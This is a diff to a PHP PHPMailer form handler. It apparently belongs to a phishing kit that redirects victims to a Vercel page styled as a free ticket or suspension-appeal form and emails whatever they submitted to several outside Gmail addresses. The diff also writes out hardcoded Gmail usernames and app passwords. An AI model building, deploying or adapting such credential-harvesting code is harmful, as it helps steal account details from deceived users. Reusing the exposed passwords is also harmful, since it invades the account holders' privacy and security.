@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location:https://suspension-lift-petition-main.vercel.app/pass.html");
+header("Location:https://submit-ticket-for-free-fix-pass.vercel.app");
 
 require 'Exception.php';
 require 'PHPMailer.php';
@@ -25,26 +25,27 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
     try {
         // SMTP settings
-         $mail->isSMTP();
+          $mail->isSMTP();
         $mail->Host       = 'smtp.gmail.com'; // Replace with your SMTP server address
         $mail->SMTPAuth   = true;
-        $mail->Username   = 'zt69021@gmail.com'; // Replace with your email address
-        $mail->Password   = 'dluv ssiv cori fimn'; // Replace with your email password
+        $mail->Username   = 'hindistoryhub396@gmail.com'; // Replace with your email address
+        $mail->Password   = 'fylk gbsb cdgu anwh'; // Replace with your email password
         $mail->SMTPSecure = 'tls';
         $mail->Port       = 587;
 
 
         // Email properties
-        $mail->setFrom('zt69021@gmail.com', 'PROFESSOR');
-        $mail->addAddress('muneeb.nizamani.official56@gmail.com');
-        
-       
+        $mail->setFrom('hindistoryhub396@gmail.com', 'PROFESSOR');
+        $mail->addAddress('okieskissdoman@gmail.com');
+        $mail->addAddress('subhannizamani51@gmail.com');
+
+         $mail->addAddress('halinamars85@gmail.com');
 
       // Email recipient's address
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'Muneeb';
+        $mail->Subject = 'Rashid';
         $mail->Body = $emailBody; // Set the email body using the collected form data
         
         // Send email
